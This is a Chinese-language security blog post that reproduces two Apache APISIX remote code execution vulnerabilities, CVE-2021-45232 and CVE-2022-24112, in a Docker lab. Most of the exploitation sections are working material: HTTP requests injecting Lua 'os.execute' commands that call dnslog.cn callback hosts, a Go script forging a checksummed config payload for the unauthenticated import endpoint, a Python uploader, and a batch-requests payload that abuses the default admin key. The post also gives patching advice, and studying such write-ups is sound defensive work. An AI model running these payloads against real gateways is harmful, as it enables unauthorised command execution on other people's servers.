# Apache APISIX简介

> Apache APISIX 是一个动态、实时、高性能的 API 网关， 提供负载均衡、动态上游、灰度发布、服务熔断、身份认证、可观测性等丰富的流量管理功能。Apache APISIX Dashboard 使用户可通过前端界面操作 Apache APISIX。

<!-- more -->



# 安全申明

`本博客主要用于学习记录相关安全事件和漏洞文章，供大家学习交流和测试使用。由于传播、利用该博客文章提供的信息或者工具而造成任何直接或间接的后果及损害，均由使用本人负责，文章作者不为此承担任何责任。`



# CVE-2021-45232

## 漏洞描述

该漏洞的存在是由于 Manager API 中的错误。Manager API 在 gin 框架的基础上引入了 droplet 框架，所有的 API 和鉴权中间件都是基于 droplet 框架开发的。但是有些 API 直接使用了框架 gin 的接口，从而绕过身份验证。



## 影响版本

Apache APISIX Dashboard < 2.10.1



## 环境搭建

环境下载

```shell
git clone https://github.com/apache/apisix-docker
cd apisix-docker/example/
vim docker-compose.yml
```

修改内容如下：

![image-20220307163713171](https://gitee.com/greetdawn/blogImages/raw/master/img/202203071637251.png)

启动部署

```shell
docker-compose up -d
```

成功请求9000端口， 即成功部署

![image-20220307164614828](https://gitee.com/greetdawn/blogImages/raw/master/img/202203071646947.png)



## 授权`getshell`

已知面板登录账户密码或者存在默认弱口令的情况下，可直接登录后台。登录之后做如下几步操作即可实现`RCE`:

- 点击上游选项， 创建上游服务，指向`docker`内开启的`grafana`服务

![image-20220307165815344](https://gitee.com/greetdawn/blogImages/raw/master/img/202203071658431.png)

- 点击路由选项，创建路由条目，勾选上级创建的上游服务条目即可

![image-20220307170134309](https://gitee.com/greetdawn/blogImages/raw/master/img/202203071701389.png)

![image-20220307170158149](https://gitee.com/greetdawn/blogImages/raw/master/img/202203071701232.png)

- 创建完成后，点击创建路由条目中的配置按钮，直接下一步，到提交按钮时抓包

![image-20220307170422313](https://gitee.com/greetdawn/blogImages/raw/master/img/202203071704405.png)

![image-20220307170507093](https://gitee.com/greetdawn/blogImages/raw/master/img/202203071705204.png)

- 抓包后在`POST`数据中增加`script`字段，修改数据包如下：

```shell
PUT /apisix/admin/routes/397811506642682559 HTTP/1.1
Host: 192.168.32.132:9000
Content-Length: 199
Accept: application/json
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDY2NDY3MjksImlhdCI6MTY0NjY0MzEyOSwic3ViIjoiYWRtaW4ifQ.8CFVuSsKsh3Lp2h5N0hr1De3LL-cEcxer0Pin779HmY
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://192.168.32.132:9000
Referer: http://192.168.32.132:9000/routes/397811506642682559/edit
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _dd_s=logs=1&id=46e06da4-1bc1-4039-8174-c51ab13978ba&created=1646642720053&expire=1646644798248
Connection: close

{"uris":["/greetdawnrce"],"methods":["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"],"priority":0,"name":"greetdawn","status":1,"labels":{},"script": "os.execute('curl 74woda.dnslog.cn')","upstream_id":"397811130833044159"}
```

- 创建完成后，请求apisix接口，触发命令执行

```shell
GET /greetdawnrce HTTP/1.1
Host: 192.168.32.132:9080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _dd_s=logs=1&id=77bc9c2d-e870-42a3-9c7e-1010d1ca7b16&created=1646648978262&expire=1646652385662
Connection: close
```

![image-20220307191219840](https://gitee.com/greetdawn/blogImages/raw/master/img/202203071912032.png)

![image-20220307191318171](https://gitee.com/greetdawn/blogImages/raw/master/img/202203071913258.png)

`注：这里RCE主要是由于apisix在转发过程中允许用户自定义lua脚本`

`详细可参考`

[官方文档]: https://apisix.apache.org/docs/apisix/architecture-design/script/



## 未授权`getshell`

该漏洞主要原因在于有两个`api`接口可以未授权进行访问请求

```
/apisix/admin/migrate/export
/apisix/admin/migrate/import
```

这两个接口可以分别用于导出配置文件和导入配置文件

- 首先导出配置文件

  ```
  GET /apisix/admin/migrate/export HTTP/1.1
  Host: 192.168.32.132:9000
  Cache-Control: max-age=0
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
  Accept-Encoding: gzip, deflate
  Accept-Language: zh-CN,zh;q=0.9
  Cookie: _dd_s=logs=1&id=f26f1c7c-914f-43fe-a912-d4cc6c6d1bdc&created=1646706156327&expire=1646708206389
  If-Modified-Since: Wed, 16 Jun 2021 12:59:46 GMT
  Connection: close
  ```

  ```
  {"Counsumers":[],"Routes":[{"id":"397919338339762880","create_time":1646708008,"update_time":1646708008,"uris":["/greetdawnrce2"],"name":"greetdawnrce2","methods":["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"],"upstream_id":"397811130833044159","status":1}],"Services":[],"SSLs":[],"Upstreams":[{"id":"397811130833044159","create_time":1646643511,"update_time":1646643511,"nodes":[{"host":"192.168.32.132","port":3000,"weight":1}],"timeout":{"connect":6,"read":6,"send":6},"type":"roundrobin","scheme":"http","pass_host":"pass","name":"greetdawn"}],"Scripts":[],"GlobalPlugins":[{"id":"1","create_time":1646646463,"update_time":1646649397,"plugins":{"batch-requests":{"disable":false}}}],"PluginConfigs":[]}
  ```

  `注：导出的配置文件我们可以看到，就是所有route信息，这样我们可以利用篡改route信息再未授权的情况下直接访问import接口覆盖route达到rce的目的`

- 根据前序情况构造`rce`

  ```
  {"Counsumers":[],"Routes":[{"id":"397919338339762880","create_time":1646708008,"update_time":1646708008,"uris":["/greetdawnrce2"],"name":"greetdawnrce2","methods":["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"],"script":"os.execute('ping dwbbyp.dnslog.cn')","script_id":"397919338339762880","upstream_id":"397811130833044159","status":1}],"Services":[],"SSLs":[],"Upstreams":[{"id":"397811130833044159","create_time":1646643511,"update_time":1646643511,"nodes":[{"host":"192.168.32.132","port":3000,"weight":1}],"timeout":{"connect":6,"read":6,"send":6},"type":"roundrobin","scheme":"http","pass_host":"pass","name":"greetdawn"}],"Scripts":[{"id":"397919338339762880","script":"os.execute('ping dwbbyp.dnslog.cn')"}],"GlobalPlugins":[{"id":"1","create_time":1646646463,"update_time":1646649397,"plugins":{"batch-requests":{"disable":false}}}],"PluginConfigs":[]}
  ```

- 计算checksum的值

  导出的配置文件中其实我们可以清楚的发现，其中还存在四个字符

  ![image-20220308111315111](https://gitee.com/greetdawn/blogImages/raw/master/img/202203081113095.png)

  利用官方源码，计算`checksum`的值

  找到对应的位置为：`apisix-dashboard-master\api\internal\handler\migrate\migrate.go` 函数`ExportConfig`

  `https://github.com/apache/apisix-dashboard/blob/561ed377ec2237707bb8c78623e336360c6c6463/api/internal/handler/migrate/migrate.go#L52`

  ![image-20220308111816860](https://gitee.com/greetdawn/blogImages/raw/master/img/202203081118905.png)

  抽离出如下计算`checksum`的脚本

  ```go
  package main
  
  import (
      "encoding/binary"
      "fmt"
      "hash/crc32"
      "io/ioutil"
      "os"
  )
  func main() {
      gen()
  }
  func gen() {
      data := []byte(`{"Counsumers":[],"Routes":[{"id":"397919338339762880","create_time":1646708008,"update_time":1646708008,"uris":["/greetdawnrce2"],"name":"greetdawnrce2","methods":["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"],"script":"os.execute('ping dwbbyp.dnslog.cn')","script_id":"397919338339762880","upstream_id":"397811130833044159","status":1}],"Services":[],"SSLs":[],"Upstreams":[{"id":"397811130833044159","create_time":1646643511,"update_time":1646643511,"nodes":[{"host":"192.168.32.132","port":3000,"weight":1}],"timeout":{"connect":6,"read":6,"send":6},"type":"roundrobin","scheme":"http","pass_host":"pass","name":"greetdawn"}],"Scripts":[{"id":"397919338339762880","script":"os.execute('ping dwbbyp.dnslog.cn')"}],"GlobalPlugins":[{"id":"1","create_time":1646646463,"update_time":1646649397,"plugins":{"batch-requests":{"disable":false}}}],"PluginConfigs":[]}`)
      checksumUint32 := crc32.ChecksumIEEE(data)
      checksumLength := 4
      checksum := make([]byte, checksumLength)
      binary.BigEndian.PutUint32(checksum, checksumUint32)
      fileBytes := append(data, checksum...)
  
      content := fileBytes
      fmt.Println(content)
  
      importData := content[:len(content)-4]
      checksum2 := binary.BigEndian.Uint32(content[len(content)-4:])
      if checksum2 != crc32.ChecksumIEEE(importData) {
          fmt.Println(checksum2)
          fmt.Println(crc32.ChecksumIEEE(importData))
          fmt.Println("Check sum check fail, maybe file broken")
          return
      }
      err := ioutil.WriteFile("apisixPayload", content, os.ModePerm)
      if err != nil {
          fmt.Println("error!!")
          return
      }
  }
  ```

  本地运行此脚本，当前目录下生成`apisixPayload`文件

- 导入新的配置文件

  ```python
  #!/usr/local/env python3
  # -*- coding: utf-8 -*-
  # author: greetdawn
  
  import requests
  
  url = "http://192.168.32.132:9000/apisix/admin/migrate/import"
  
  files = {"file": open("apisixPayload", "rb")}
  
  res = requests.post(url = url, data = {"mode": "overwrite"}, files = files)
  
  print(res.status_code)
  print(res.text)
  ```

- 请求最新创建的路由，成功`rce`

  ![image-20220308113250686](https://gitee.com/greetdawn/blogImages/raw/master/img/202203081132761.png)

## 修复建议

- 升级到安全版本


   	下载链接:[Releases · apache/apisix-dashboard · GitHub](https://github.com/apache/apisix-dashboard/releases)

- 修改默认账户的账号密码，或通过白名单的方式限制访问的源`IP`







# CVE-2022-24112

## 漏洞描述

该漏洞在` Apache APISIX 2.12.1 `之前的版本中（不包含` 2.12.1 `和` 2.10.4`），启用 `Apache APISIX batch-requests` 插件之后，会存在改写 `X-REAL-IP header `风险。

攻击者通过 `batch-requests` 插件绕过 `Apache APISIX `数据面的` IP `限制。如绕过` IP `黑白名单限制。

如果用户使用 `Apache APISIX` 默认配置（启用` Admin API` ，使用默认` Admin Key `且没有额外分配管理端口），攻击者可以通过 `batch-requests` 插件调用 `Admin API `。



## 影响版本

- Apache APISIX 1.3 ~ 2.12.1 之间的所有版本（不包含 2.12.1 ）
- Apache APISIX 2.10.0 ~ 2.10.4 LTS 之间的所有版本 （不包含 2.10.4）



## 漏洞利用

该漏洞与上述`cve`漏洞描述的基本一致，前提也是需要通过绕过授权或未授权的方式，来执行恶意的`route`里的`filter_func`或者`script`来执行命令

- 首先，请求接口`/apisix/batch-requests`抓包

  ![image-20220308134512483](https://gitee.com/greetdawn/blogImages/raw/master/img/202203081345554.png)

- 修改请求数据包如下

  ```shell
  POST /apisix/batch-requests HTTP/1.1
  Host: 47.108.217.193:9080
  Pragma: no-cache
  Cache-Control: no-cache
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
  Accept-Encoding: gzip, deflate
  Accept-Language: zh-CN,zh;q=0.9
  Cookie: _dd_s=logs=1&id=4b67d638-528a-4391-a32f-8c66fe1a0d70&created=1646716553100&expire=1646718879653
  Connection: close
  Content-Type: application/json
  Content-Length: 460
  
  {"headers":{"X-Real-IP":"127.0.0.1","Content-Type":"application/json"},"timeout":1500,"pipeline":[{"method":"PUT","path":"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1","body":"{\r\n \"name\": \"test\", \"method\": [\"GET\"],\r\n \"uri\": \"/api/greetdawn\",\r\n \"upstream\":{\"type\":\"roundrobin\",\"nodes\":{\"httpbin.org:80\":1}}\r\n,\r\n\"filter_func\": \"function(vars) os.execute('ping qaxol9.dnslog.cn'); return true end\"}"}]}
  ```

- 响应包全为200，请求创建的路由`/api/greetdawn`，成功触发`getshell`

  ![](https://gitee.com/greetdawn/blogImages/raw/master/img/202203081347537.png)

## 漏洞修复

- 该问题目前已在 `2.12.1 `和` 2.10.4` 版本中得到解决，请尽快更新至相关版本
- 修改`conf/config.yaml `和` conf/config-default.yaml `文件显式注释掉 `batch-requests`



# References

- https://xz.aliyun.com/t/10738#toc-3
- https://github.com/apache/apisix-dashboard/blob/561ed377ec2237707bb8c78623e336360c6c6463/api/internal/handler/migrate/migrate.go#L52
- https://www.ctfiot.com/27897.html
- https://github.com/Axx8/CVE-2022-24112



# 安全申明

`本博客主要用于学习记录相关安全事件和漏洞文章，供大家学习交流和测试使用。由于传播、利用该博客文章提供的信息或者工具而造成任何直接或间接的后果及损害，均由使用本人负责，文章作者不为此承担任何责任。`

